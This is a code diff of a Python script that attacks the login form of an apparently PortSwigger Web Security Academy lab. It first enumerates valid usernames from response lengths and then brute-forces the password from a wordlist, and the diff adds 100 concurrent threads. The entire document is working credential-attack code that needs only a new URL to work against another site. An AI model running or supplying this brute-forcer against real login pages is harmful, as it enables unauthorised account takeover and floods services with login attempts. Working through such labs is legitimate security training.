@@ -1,24 +1,32 @@
 import requests
 from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
 
 usernames = open('username.txt', 'r').readlines()
 passwords = open('password.txt', 'r').readlines()
 
-url = 'https://acd81fbf1ed5f2d0c09a4b3d004e0001.web-security-academy.net/login'
+url = 'https://ac981f8d1e7663c0c0d9c7e900ae00fc.web-security-academy.net/login'
 
-length = {}
-for user in usernames:
-    l = []
-    for n in range(1, 6):
-        res = requests.post(url, data={'username' : user.strip(), 'password' : 'a' + str(n)})
-        l.append(len(res.text))
-    length[user.strip()] = max(l)
+def get_username(data):
+    return (str(data['username']), len(requests.post(url, data=data).text))
 
-username = str(max(length, key=length.get)).strip()
-print(username)
-for passwd in passwords:
-    res = requests.post(url, data={'username' : username, 'password' : passwd.strip()})
+def get_password(data):
+    res = requests.post(url, data = data)
     soup = BeautifulSoup(res.text, 'html.parser')
-    if len(soup.find_all('p', class_='is-warning')) == 0:
-        print(passwd)
-        break
+    
+    return (str(data['password']), len(soup.find_all('p', class_='is-warning')))
+
+with ThreadPoolExecutor(max_workers=100) as pool:
+    data = []
+    for user in usernames:
+        for n in range(1, 6):
+            data.append({'username' : user.strip(), 'password' : 'a' + str(n)})
+    length = dict(list(pool.map(get_username, data)))
+    username = str(max(length, key=length.get))
+    print(username)
+    data.clear()
+    for passwd in passwords:
+        data.append({'username' : username, 'password' : passwd.strip()})
+    length = dict(list(pool.map(get_password, data)))
+    password = str(min(length, key=length.get))
+    print(password)
